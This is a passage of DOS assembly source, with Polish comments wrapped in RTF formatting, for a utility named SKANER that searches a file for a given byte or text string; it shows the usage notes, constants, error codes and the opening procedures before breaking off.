\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; _ Wywolanie: SKANER NazwaPliku CiagBajtow                                  ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; _ Ciag moze skladac sie z liczb zapisanych heksalnie lub zwyklego tekstu   ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;   np:                                                                      ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;       _ CD 21                - szuka wywolania przerwania 21h              ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;       _ 'wirus'              - szuka slowa "wirus"                         ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;       _ 'abc'80C5'def'EE  F6 - szuka lancucha "abc\'c7+def_\'f7"                 ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; _ Maksymalna dlugosc wyszukiwanego ciagu           =   128 bajtow.         ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; _ Dlugosc jednorazowo odczytywanych danych z pliku = 65024 bajtow          ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;   65024=512*127=127 sektorow, 512 bajtowych                                ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; _ Maksymalna ilosc zliczanych wystapien ciagu      = 2^32  razy            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; _ Pliki z atrybutami Hidden, System przed odczytem maja zmieniany atrybut  ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;   na Archive; po skonczeniu programu przywracany jest oryginalny atrybut   ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; _ Procedura obslugi INT 24h <dialog ARIF-Abort,Retry,Ignore,Fail>          ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;   zastapiona zostala sekwencja sygnalizujaca blad programowi               ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; _ Wyszukiwane sa wszystkie mozliwe wystapenia ciagu                        ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;   (takze zachodzace na siebie)                                             ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                         Definicje Stalych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch JUMPS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;stale logiczne}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Falsz                equ 00h                        ; \\ definicja dwoch stalych logicznych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Prawda               equ Falsz+1                    ; / 0=Falsz i 1=Prawda}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; stale ogolne}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch RozmiarStosu         equ 128                        ; rozmiar stosu w slowach dwubajtowych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch RozmiarCiagu        equ 128                         ; rozmiar bufora na wyszukiwany ciag}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch RozmiarBuforaDanych  equ 127*512                    ; rozmiar bufora na dane = segment 64K-512}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DlugNazwyPliku       equ 128                        ; dlugosc pelnej nazwy pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch LiniaPolecen         equ 80h                        ; adres (w PSP) do parametrow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; stale znakowe}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ZnakTabulacji        equ 09h                        ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ZnakSpacji           equ ' '                        ;  \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ZnakKoncaLinii       equ 0Dh                        ;   - stale znakowe}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CR                   equ 0Dh                        ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch LF                   equ 0Ah                        ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; stale bledow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; na ich podstawie nastepuje obliczenie ofsetu komunikatu o bledzie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch BlBezBledu           equ 00h                        ; nie ma bledu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch BlBrakParametrow     equ 01h                        ; blad : nie ma parametrow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch BlBrakNazwyPliku     equ 02h                        ; blad : brak nazwy pliku w parametrach}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch BlBrakCiagu          equ 03h                        ; blad : brak ciagu do wyszukania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch BlZlyCiag            equ 04h                        ; blad : ciag zawiera bledy}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch BlBrakPlikuNaDysku   equ 05h                        ; blad : brak pliku podanego jako parametr}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch BlBlad_ARIF          equ 06h                        ; blad : brak dostepu do pliku (int 24h)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch BlZlyAtrybutPliku    equ 07h                        ; blad : nie plik tylko etykieta dysku lub katalog}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch BlBrakDostepuDoPliku equ 08h                        ; blad : nie mozna zmienic atrybutow na archive}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch BlNieMogeOtworzyc    equ 09h                        ; blad : nie moge otworzyc pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch BlNieMogeCzytac      equ 0Ah                        ; blad : nie moge czytac pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch BlNieMogeZamknac     equ 0Bh                        ; blad : nie moge zamknac pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch BlPlikZaKrotki       equ 0Ch                        ; blad : plik krotszy niz dlugosc ciagu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; stale drukowania wrostkow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;    7 bit=1 wywolaj procedure konwersji, ktorej adres w [si+1]}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;    7 bit=0 wyswietl tekst, ktorego adres jest pod [si+1]}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DrPlik               equ 01h                        ; stala dla wrostka NazwaPliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DrCiag               equ 02h                        ; stala dla wrostka Ciag}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DrUnIntDec           equ 83h                        ; stala dla wrostka - liczby bez znaku typu Int (dziesietne)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DrUnIntHex           equ 84h                        ; stala dla wrostka - liczby bez znaku typu Int (szesnastkowo)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch IleWrostkow          equ 04h                        ; ile maksymalnie wrostkow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; stale DOS-owe}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TrybOtwarciaPliku    equ 00000000b                  ; oznacza otwarcie pliku tylko do odczytu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch AtReadOnly           equ 00000001b                  ;\\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch AtHidden             equ 00000010b                  ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch AtSystem             equ 00000100b                  ;  \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch AtVolumeID           equ 00001000b                  ;   - atrybuty pozycji katalogu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch AtDirectory          equ 00010000b                  ;   /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch AtArchive            equ 00100000b                  ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch AtAll                equ 00111111b                  ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; definicja bufora DTA (Disk Transfer Area)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DTA_STRUC struc                                     ; struktura potrzebna dla funkcji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch           NieWazne     db 21 dup(?)                 ; 4E i 4F sluzacych do poszukiwania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch           Atrybut      db ?                         ; pierwszego (4E) i nastepnego (4F)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch           Czas         dw ?                         ; wystapienia w katalogu (pliku, katalogu,itp.)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch           Data         dw ?                         ; opisuje wszystkie parametry pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch           Dlugosc      dd ?                         ; zawarte w FAT z wyjatkiem pierwszego numeru JAP}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch           Nazwa        db 13 dup(?)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DTA_STRUC ends}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                         Segment Kodu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SKANER        SEGMENT}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 ASSUME CS:SKANER, ds:SKANER}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch          Start:                                     ; poczatek programu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 Call UstawParametrySystemu          ; ustaw DS+nowe (DTA i int 24h)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov si,Offset TeCopyRight           ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 Call DrukLn                         ; wyswietl komunikat o programie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 Call CzytajParametry                ; Wez z PSP:80h parametry : Plik+Ciag}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jc Blad                             ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 Call SprawdzPlik                    ; czy plik istnieje ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jc blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 Call SzukajLancuch                  ; Szukaj lancucha w pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jc Blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov NumerBledu,BlBezBledu           ; wszystko OK !}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Blad:                                               ; skacz tu, jesli jakis blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 Call PrzywrocParametrySystemu       ; stare DTA+INT 24h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 Call OstatniKomunikat               ; zwraca 0=bez bledu lub FF=blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov ah, 4Ch                         ; funkcja powrotu do systemu DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 int 21h                             ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch OstatniKomunikat proc near                          ; wyswietla komunikat na koncu programu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 pushf                               ; zachowaj znaczniki, potrzebne pozniej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov ax,seg SKANER}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov ds,ax                           ; DS=segment danych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov al, NumerBledu                  ; al=numer bledu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 cbw                                 ; ax=numer bledu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 shl ax,1                            ; ax=ax*2, bo kazdy ofset=2 bajty}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 add ax,Offset OffsetyKomunikatow    ; ax=tablica z adresami komunikatow bledow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 xchg ax,bx                          ; bx=tablica z adresami komunikatow bledow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                                     ; [bx]=tablica[blad]}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov si,[bx]                         ; dx=offset do komunikatu o bledzie (lub 'OK')}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 Call DrukLn                         ; wypisz komunikat}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 popf                                ; przywroc znaczniki}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov al,0                            ; w al przekaz kod bledu, 0=bez bledu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 sbb al,0                            ; jezeli blad, to al=FF}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 ret}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch OstatniKomunikat endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SzukajLancuch   proc near                           ; otwiera plik i szuka zadany ciag}{\f2\fs24\lang1045{\*\listtag0}\par}
